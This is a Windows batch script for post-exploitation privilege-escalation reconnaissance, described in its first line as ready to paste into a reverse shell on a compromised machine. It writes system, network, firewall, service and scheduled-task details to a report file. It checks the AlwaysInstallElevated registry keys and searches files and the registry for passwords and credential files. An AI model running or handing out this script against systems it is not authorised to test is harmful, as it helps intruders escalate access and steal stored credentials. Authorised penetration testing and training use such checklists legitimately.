echo Windows Privilege Escalation Report - Copy and Paste Version (No file upload required) - Copy and Paste this script into your reverse shell console to create a simple report file.
@echo --------- BASIC WINDOWS RECON ---------  > report.txt
 timeout 1
 net config Workstation  >> report.txt
 timeout 1
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
 timeout 1
 hostname >> report.txt
 timeout 1
 net users >> report.txt
 timeout 1
 ipconfig /all >> report.txt
 timeout 1
 route print >> report.txt
 timeout 1
 arp -A >> report.txt
 timeout 1
 netstat -ano >> report.txt
 timeout 1
 netsh firewall show state >> report.txt	
 timeout 1
 netsh firewall show config >> report.txt
 timeout 1
 schtasks /query /fo LIST /v >> report.txt
 timeout 1
 tasklist /SVC >> report.txt
 timeout 1
 net start >> report.txt
 timeout 1
 DRIVERQUERY >> report.txt
 timeout 1
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
 timeout 1
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
 timeout 1
 dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
 timeout 1
 findstr /si password *.xml *.ini *.txt >> report.txt
 timeout 1
 reg query HKLM /f password /t REG_SZ /s >> report.txt
 timeout 1
 reg query HKCU /f password /t REG_SZ /s >> report.txt 
 timeout 1
 dir "C:\"
 timeout 1
 dir "C:\Program Files\" >> report.txt
 timeout 1
 dir "C:\Program Files (x86)\"
 timeout 1
 dir "C:\Users\"
 timeout 1
 dir "C:\Users\Public\"
 timeout 1
 echo REPORT COMPLETE!
